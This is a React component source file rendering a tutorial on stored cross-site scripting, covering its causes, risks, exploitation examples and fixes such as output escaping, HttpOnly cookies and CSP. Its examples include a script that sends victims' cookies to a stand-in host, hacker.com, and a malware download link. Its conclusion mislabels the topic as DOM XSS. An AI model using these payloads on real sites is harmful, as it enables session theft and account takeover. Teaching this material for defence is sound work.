import CodeBlock from "./CodeBlock";
import "./article.css"
import ScrollToTop from "../scrollToTop/scrollToTop";

import Header from "./shared/header"
import Auther from "./shared/auther"
import Aside from "./shared/aside"
import ArticlePart from "./shared/articlePart"
import Footer from "./shared/footer"


export default function XSS() {
  return (
    <>
      <ScrollToTop/> {/* Scroll To Top Button */}
      <Header articleName="Stored XSS" LabName="Stored XSS Labs"/>
      <Auther autherName="Waleed Sameer" readTime="5" imageSrc="/imgs/hacker.png"><span>Stored</span> <span>C</span>ross <span>S</span>ite <span>S</span>cripting</Auther>
      <Aside/>
      <ArticleContent/>
    </>
  )
}

function ArticleContent() {
  return (
      <>
        <article>
          <ArticlePart className="bug-definition">
            <h4>1. What's The Stored-XSS Vulnerability ?</h4>
            <div>
              <p>
                Stored Cross-Site Scripting (Stored XSS) is a type of XSS attack 
                where a <b>malicious script is permanently injected into a web application's database.</b>
                <br/>
                This makes <b>Stored XSS a persistent and highly impactful attack</b>, often targeting comment sections,
                chat systems, user profiles, and other areas where user-generated content is stored.
                <br/>
                <br/>
                These scripts are then <b>executed in the victim's browser</b> , leading to: 
              </p> 
              <ul>
                <li><b>Stealing sensitive information</b> (cookies, session tokens).</li>
                <li><b>Defacing websites or modifying their behavior.</b></li>
                <li><b>Performing unauthorized actions on behalf of users.</b></li>
              </ul>
              <p>Example in simple terms: Imagine a comment box on a website where a user can enter :</p>
              <CodeBlock language={"js"} code={`<script>alert(document.cookie)</script>`}/>
              <p>and it pops up an alert when someone views the comment, Then it's XSS!</p>
            </div>
          </ArticlePart>


          <ArticlePart className="when-happens">
            <h4>2. When and Why Does XSS Happen?</h4>
            <div>
              <p>XSS occurs <b>when a web application fails to properly validate, sanitize, or escape user input before rendering it in a browser.</b> 
                <br/>
                <br/>
                Stored XSS, It can happen in Unfiltered Fields Like:
              </p>
              <ul>
                <li>A blog that allows users to <b>post comments</b> </li>
                <li><b>A user profile </b>Like (bio, first name, last name )</li>
                <li><b>Admin Panels</b> When user submitted messages without filtration </li>
                <li><b>Web storage (localStorage).</b> but Its not common!</li>
              </ul>
              <p>Why does this happen?</p>
              <ul>
                <li><b>Developers trust user input too much.</b></li>
                <li><b>The application directly renders user-generated content without escaping characters.</b></li>
                <li>In Some Cases, Can Happens because <b>Weak Content Security Policy (CSP) settings</b>.</li>
              </ul>
            </div>
          </ArticlePart>


          <ArticlePart className="risks-impact">
            <h4>3. What're The Risks and Impact of Stored-XSS ?</h4>
            <div>
              <p>
                Stored XSS can have <b>serious consequences</b> because the <b>malicious script is automatically loaded for all users visiting the Vulnerable page.</b>:
                <br/>
              </p>
              <ul>
                <li><b>Account Takeovers</b>, Stealing session cookies to hijack user accounts.
                <CodeBlock language={"js"} code={`alert(document.cookie) // For Elaboration, Send cookies to another Server!`}/>
                </li>
                <li><b>Phishing Attacks</b> - Injecting fake login forms to steal credentials.</li>
                <li><b>Defacing Websites</b> - Altering the content of a webpage.</li>
                <li><b>Spreading Malware</b> - Injecting malicious scripts to download trojans.</li>
                <li><b>Exploiting Admin Panels</b> - If an admin views the infected page, their session possible to hijack.</li>
              </ul>
            </div>
          </ArticlePart>


          <ArticlePart className="real-exploitation">
            <h4>4. What're Real Scenarios and Exploitation Examples ?</h4>
            <div>
              <ul>
                <li><b>Stealing Cookies</b> 
                  <CodeBlock language={"html"} code={`// [-] If you're a bug bounty Hunter You can use it as basic PoC (Proof of Concept)\n\n<script>\n  document.location=\`http://hacker.com/steal.php?cookie=\${document.cookie}&userAgent=\${navigator.userAgent}\` \n</script>\n// - Don't be evil, use it as PoC or for Just awareness!`}/>
                  This sends the victim’s cookies to an attacker-controlled server.
                </li>
                <li>
                  <b>Injecting Malicious Links</b> to download trojans!
                  <CodeBlock language={"js"} code={`<a href="https://hacker.com/malware.exe"> Click Here To Get Free Sweet! </a>\n\n//"Free Sweet" Just For kidding :)`}/>
                </li>
              </ul>
            </div>
          </ArticlePart>

          <ArticlePart className="fix-prevent">
            <h4>5. How to Fix & Secure Your Website ?</h4>
            <div>
              <ul>
                <li>
                  <b>Sanitize & Escape User Input</b>
                  <ul>
                    <li>
                      <b>In PHP</b>, Use <b>htmlspecialchars </b> function
                      <CodeBlock language={"php"} code={`htmlspecialchars($_GET["userInput"]);`}/>
                    </li> 
                    <li>
                      <b>In JavaScript</b>, You can do this
                      <CodeBlock language={"js"} code={`function htmlEncode(str){\n  return String(str).replace(/[^\\w. ]/gi, function(c){\n    return '&#'+c.charCodeAt(0)+';';\n  });\n  }\n  // Now, Use it\n  htmlEncode(untrustedValue)`}/>
                      <b>- Reference is <a href="https://portswigger.net/web-security/cross-site-scripting/preventing" target="_blank" style={{ color: "#2626f8", textDecoration: "underline"}}>Portswigger</a></b>
                    </li>
                    <br/>
                  </ul>
                </li>
                <li>
                <b>Use HttpOnly & Secure Flags on Cookies, by setcookie function</b>
                <br/>
                <br/>
                {/* <ul>
                  <li> */}
                  <CodeBlock language={"php"} code={`setcookie("user_session", "random_value", [\n  'expires' => strtotime("+1 Month"),\n  'path' => '/',\n  'domain' => '', \n  'secure' => true, // [-] Only send over HTTPS\n  'httponly' => true, // [-] JavaScript cannot access this cookie\n  'samesite' => 'Strict' // [-] Prevents CSRF attacks\n]);\n`}/>
                  {/* </li>
                </ul> */}
                </li>
            <br/>
            <li>
              <b>Use HttpOnly & Secure Flags on Cookies, but globally by edit php.ini</b>
              <br/>
              <br/>
              <CodeBlock language={"ini"} code={`# [-] Now, This applies security settings globally for all PHP sessions.\n\nsession.cookie_secure = 1\nsession.cookie_httponly = 1\nsession.cookie_samesite = "Strict"\n`}/>
            </li>
            <br/>
            <li>
              <b>Set a Strong Content Security Policy (CSP), by Set CSP headers to restrict scripts </b>
              <br/>
              <br/>
              <CodeBlock language={"http"} code={`Content-Security-Policy: default-src 'self'; script-src 'self';`}/>
              <br/>
            </li>
          </ul>
        </div>
          </ArticlePart>
          <ArticlePart className="conclusion-resources">
            <h4>- The Conclusion & Additional Resources</h4>
            <div>
              <h3>The Conclusion</h3>
              <br/>
              DOM XSS is particularly <b>dangerous because it bypasses server-side protections</b> and relies solely on insecure JavaScript.
              <br/>
              Whether you're a <b>web developer</b> trying to secure your web app or a <b>bug hunter</b> looking for vulnerabilities,
              understanding DOM-XSS Vulnerability is essential in web security.
              <br/>
              <br/>
            <h3>Additional Resources</h3>
              <br/>
              <ul>
                <li>
                  <b>
                    <a href="https://portswigger.net/web-security/all-labs#cross-site-scripting" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Portswigger XSS Labs</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >OWASP XSS Cheat Sheet</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://xss-game.appspot.com/" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Google XSS Game</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://www.google.com/search?q=bug+bounty+reports+on+xss+intitle+medium" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Bug Bounty Reports</a>
                    </b>
                </li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="good-bye">
          <h4>🟡 Last but not Least!</h4>
          <div>
            <p style={{fontWeight: "bold"}}>"Think like an attacker, defend like a guardian! The best security expert is the one who never stops learning! "</p>
            <br/>
            <p style={{color: "var(--main-color)", fontFamily: 'heading-font',fontWeight: "bold"}}>
              <a href="https://facebook.com/fandeta7"
              target="_blank"
              style={{color: "var(--main-color)", textDecoration: "underline"}}>Fandeta</a> was here!</p>
          </div>

          </ArticlePart>
        </article>
        <Footer/>
      </>
  )
}

